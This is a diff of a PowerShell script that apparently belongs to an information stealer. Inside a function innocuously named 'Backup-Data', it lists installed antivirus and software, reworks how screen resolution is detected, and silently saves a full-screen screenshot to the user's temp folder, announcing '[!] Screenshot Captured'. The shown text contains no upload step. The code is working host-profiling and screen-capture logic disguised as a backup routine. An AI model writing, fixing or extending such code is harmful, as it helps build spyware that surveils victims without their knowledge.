@@ -216,7 +216,10 @@ function Backup-Data {
     }
     $avlist = Get-InstalledAV | Format-Table | Out-String
     
-    $screen = wmic path Win32_VideoController get VideoModeDescription /format:csv | Select-String -Pattern "\d{3,4} x \d{3,4}" | ForEach-Object { $_.Matches.Value }
+    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
+    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
+    $split = "x"
+    $screen = "$width" + "$split" + "$height"
 
     $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
     Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
@@ -1046,17 +1049,15 @@ function Backup-Data {
 
     $main_temp = "$env:localappdata\temp"
 
-    $width, $height = $screen -split ' x '
-    $monitor = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $top = $monitor.Top
-    $left = $monitor.Left
-    $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, [int]$width, [int]$height)
-    $image = New-Object System.Drawing.Bitmap([int]$bounds.Width, [int]$bounds.Height)
-    $graphics = [System.Drawing.Graphics]::FromImage($image)
-    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-    $image.Save("$main_temp\screenshot.png")
+    $top = ($screen.Bounds.Top | Measure-Object -Minimum).Minimum
+    $left = ($screen.Bounds.Left | Measure-Object -Minimum).Minimum
+    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $bmp.Save("$main_temp\screenshot.png")
     $graphics.Dispose()
-    $image.Dispose()
+    $bmp.Dispose()
 
 
     Write-Host "[!] Screenshot Captured" -ForegroundColor Green
